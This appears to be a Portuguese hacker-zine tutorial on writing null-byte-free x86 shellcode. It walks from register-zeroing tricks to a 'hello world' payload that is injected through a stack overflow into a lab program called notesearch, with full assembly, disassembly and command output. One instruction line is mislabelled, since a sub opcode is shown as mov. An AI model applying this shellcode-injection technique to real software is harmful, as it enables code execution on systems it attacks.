+---------------------------------
+Machine Code         Montagem
+---------------------------------
+B8 04 00 00 00       mov EAX, 0x4
+66 b8 04 00          mov AX, 0x4
+B0 04                mov al, 0x4
+---------------------------------
+
+O uso de registrador AL, BL, CL ou DL colocará o byte menos significativo corretamente em um extended register correspondente sem criar qualquer null byte
+no código de máquina. Contudo, os três primeiros bytes do registrador ainda poderiam conter alguma coisa. Especialmente para o shellcode, uma vez que ele
+assumirá um outro processo. Se queremos que os valores do registradores de 32 bits estejam corretos, precisamos zerar o registrador inteiro antes da instrução
+mov - mas isso, novamente, precisa ser feito sem usar null bytes. Aqui estão algumas "mout instructions" *por assim dizer, simples. Essas duas primeiras elas
+incrementam e decrementam os operandos por 1.
+
+inc <target> -> Incrementa o operando alvo adicionando 1
+dec <target> -> Decrementa o operando alvo subtraindo 1
+
+As próx instruções que vou explicar, tem dois operandos. Todos eles fazem uma aritmética simples e operações lógicas mais rápidas entre dois operandos, guardando
+o resultado no primeiro operando.
+
+add <dest>, <source> -> Adiciona o operando de origem ao operando de destino, guardando o resultado no primeiro.
+sub <dest>, <source> -> Subtrai o operando de origem do operando de destino, guardando o resultado no primeiro.
+and <dest>, <source> -> Executa uma operação binária lógica and, comparando cada bit de um operando com o bit correspondente do outro operando.
+xor <dest>, <source> -> Executa uma operação binária lógica or exclusiva, comparando cada bit de um operando com o bit correspondente do outro operando.
+
+Você pode encontrar mais referências aqui -> http://www.numaboa.com.br/informatica/tutos/assembly/1122-instrucoes-comuns
+
+Um método possível de resolução dos null bytes é mover um número arbitrário de 32 bits para dentro do registrador e então subtrai o valor usando mov e sub:
+
+B8 44 33 22 11   mov eax,0x11223344
+2D 44 33 22 11   mov eax,0x11223344
+
+Essa técnica tira 10 bytes de zero de um único registrador, fazendo o shellcode montado maior do que o necessário. Para otimizar isso: O valor de DWORD
+especificado em cada instrução abrange 80% do código. Subtrair qualquer valor de si mesmo também produz zero e não exige dado estático. Isso pode ser feito
+com uma instrução única de 2 bytes:
+
+29 c0        sub eax,eax
+
+O uso de sub funcionará bem enquanto estiver zerando registradores no começo do shellcode. Ela modificará os flags do processador, usados contudo, para ramificações;
+Por essa razão, há uma instrução preferencial de dois bytes que é usada para zerar registradores na maioria dos shellcodes. Xor executa uma operação or exclusiva
+sobre os bits em um registrador. Visto que 1 xor 1 resulta em um 0, e 0 xor resulta em um 0, qualquer valor de um xor dele mesmo resultará em 0 *Sacou? Lulzzzz
+
+Você pode usar subscriptions para zerar registradores - sendo usadas no início do shellcode -. Faremos um novo helloworld, evitando totalmente bytes nulos, utilizando
+o xor:
+
+- helloworld3.s
+BITS 32             ; tell nasm this is 32-bit code
+
+jmp short one       ; jump down to a call at the end
+
+two:
+; ssize_t write(int fd, const void *buf, size_t count);
+  pop ecx           ; pop the return address (string ptr) into ecx
+  xor eax, eax      ; zero out full 32-bits of eax register
+  mov al, 4         ; write syscall #4 to the low byte of eax
+  xor ebx, ebx      ; zero out ebx
+  inc ebx           ; increment ebx to 1, STDOUT file descriptor
+  xor edx, edx
+  mov dl, 15        ; length of the string
+  int 0x80          ; do syscall: write(1, string, 14)
+
+; void _exit(int status);
+  mov al, 1        ; exit syscall #1, the top 3 bytes are still zeroed
+  dec ebx          ; decrement ebx back down to 0 for status = 0   
+  int 0x80         ; do syscall:  exit(0)
+
+one:
+  call two   ; call back upwards to avoid null bytes
+  db "Hello, world!", 0x0a, 0x0d  ; with newline and carriage return bytes
+
+Vamos checar os bytes nulos...
+
+root@nbdu1nder-desktop:/home/nbdu1nder/src # nasm helloworld3.s
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ndisasm -b32 helloworld3
+00000000  EB13              jmp short 0x15
+00000002  59                pop ecx
+00000003  31C0              xor eax,eax
+00000005  B004              mov al,0x4
+00000007  31DB              xor ebx,ebx
+00000009  43                inc ebx
+0000000A  31D2              xor edx,edx
+0000000C  B20F              mov dl,0xf
+0000000E  CD80              int 0x80
+00000010  B001              mov al,0x1
+00000012  4B                dec ebx
+00000013  CD80              int 0x80
+00000015  E8E8FFFFFF        call 0x2
+0000001A  48                dec eax
+0000001B  656C              gs insb
+0000001D  6C                insb
+0000001E  6F                outsd
+0000001F  2C20              sub al,0x20
+00000021  776F              ja 0x92
+00000023  726C              jc 0x91
+00000025  64210A            and [fs:edx],ecx
+00000028  0D                db 0x0D
+
+Bazinga! Agora vamos utilizá-lo basicamente como um exploit no nosso programa vulnerável:
+
+root@nbdu1nder-desktop:/home/nbdu1nder/src # export SHELLCODE=$(cat helloworld3)
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ./getenvaddr SHELLCODE ./notesearch
+SHELLCODE will be at 0xbffff9c1
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ./notesearch $(perl -e 'print "\xc6\xf9\xff\xbf"x40')
+-------[ end of note data ]-------
+Hello, world!
+root@nbdu1nder-desktop:/home/nbdu1nder/src # 
+
+
+
+$~ FINAL CONSIDERATIONS ~$
+Espero que tenham compreendido, escrever sobre esse assunto é bastante complicado então, se não gostou, problema é seu n0000bbz! r$r$r$
+
+
+
+
+nbdu1nder corp. 09/13
